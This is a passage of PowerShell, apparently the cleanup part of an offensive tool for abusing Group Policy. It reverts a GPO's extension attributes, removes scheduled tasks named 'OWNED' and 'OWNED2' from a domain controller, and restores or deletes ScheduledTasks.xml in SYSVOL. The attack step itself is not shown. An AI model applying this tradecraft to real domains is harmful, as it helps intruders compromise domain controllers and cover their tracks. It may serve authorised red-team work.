    Write-Host "----------------------------------------------------------------------------------`n----------------------------------------------------------------------------------`n----------------------------------------------------------------------------------`n"
    $gray+" Reverting extensions back to what they were"
    if($noext -ne 1){
    Set-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
    } else {
        Clear-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
    }
    if($noext -ne 1){
        $green+" gPCMachineExtensionNames reverted back to -> $InitialExtensions"
    } else {
        $green+" Cleared gPCMachineExtensionNames!"
    }
    $gray+" Removing the scheduled task from the DC"
    # Trying to delete the scheduled task from the DC 
    try{
        Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
        }
    catch{
        $red+" Scheduled Task Removal Failed! login to $dc and check if it's already removed, or remove it manually!."
    }
    if($SecondTaskXMLPath){
        try{
            Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED2" -Confirm:$false
            }
        catch{
            $red+" Second Scheduled Task Removal Failed! login to the $dc and check if it's already removed, or remove it manually!."
        }
    }
        # Reverting the ScheduledTasks.xml to the backup or deletes it 
        Remove-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
            Move-Item \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
            $green+" XML file restored!"
        } else {
            $green+" File removed from SYSVOL"
        }
    
    if($Log){
        Stop-Transcript
    }
}
